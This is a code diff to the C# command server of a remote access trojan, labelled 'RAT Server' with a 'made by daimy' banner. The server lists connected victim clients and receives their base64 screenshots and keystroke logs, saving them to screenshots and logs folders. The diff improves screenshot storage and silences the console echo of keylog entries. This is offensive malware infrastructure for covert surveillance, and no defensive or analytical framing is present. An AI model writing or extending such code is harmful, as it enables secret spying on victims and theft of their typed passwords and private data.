@@ -23,6 +23,7 @@ class RATServer
         {
             Console.Clear();
             Console.WriteLine("=== RAT Server ===");
+            Console.WriteLine("made by daimy :)");
             Console.WriteLine("1. List Clients");
             Console.WriteLine("2. Interact with Client");
             Console.WriteLine("3. Exit");
@@ -126,17 +127,16 @@ class ClientHandler
     {
         try
         {
-            Console.WriteLine($"[Client {ClientID}] Handling client...");
-
-            if (!Directory.Exists("logs"))
+            string screenshotsDirectory = "screenshots";
+            if (!Directory.Exists(screenshotsDirectory))
             {
-                Directory.CreateDirectory("logs");
+                Directory.CreateDirectory(screenshotsDirectory);
             }
 
             string line;
             while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
             {
-                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
+                //Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
             }
 
             while (true)
@@ -148,24 +148,28 @@ class ClientHandler
                     break;
                 }
 
-                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
+                // Console.WriteLine($"[Client {ClientID}] Received: {line}");
 
                 if (line.StartsWith("[SCREENSHOT]"))
                 {
                     string base64Image = line.Replace("[SCREENSHOT] ", "");
                     byte[] imageData = Convert.FromBase64String(base64Image);
-                    File.WriteAllBytes($"screenshots/screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg", imageData);
-                    Console.WriteLine($"[Client {ClientID}] Screenshot saved.");
+
+                    string screenshotPath = Path.Combine(screenshotsDirectory, $"screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
+                    File.WriteAllBytes(screenshotPath, imageData);
+
+                    Console.WriteLine($"[Client {ClientID}] Screenshot saved to {screenshotPath}");
                 }
                 else if (line.StartsWith("[KEYLOG]"))
                 {
                     string logEntry = line.Replace("[KEYLOG] ", "");
-                    File.AppendAllText($"logs/keylog_{ClientID}.txt", logEntry + Environment.NewLine); 
-                    Console.WriteLine($"[Client {ClientID}] Keylog: {logEntry}");
+                    File.AppendAllText($"logs/keylog_{ClientID}.txt", logEntry + Environment.NewLine);
+
+                    // Console.WriteLine($"[Client {ClientID}] Keylog: {logEntry}");
                 }
                 else
                 {
-                    Console.WriteLine($"[Client {ClientID}] {line}");
+                    // Console.WriteLine($"[Client {ClientID}] {line}");
                 }
             }
         }
@@ -174,6 +178,8 @@ class ClientHandler
             Console.WriteLine($"[Client {ClientID} Error] {ex.Message}");
         }
     }
+
+
     public void Interact()
     {
         while (true)
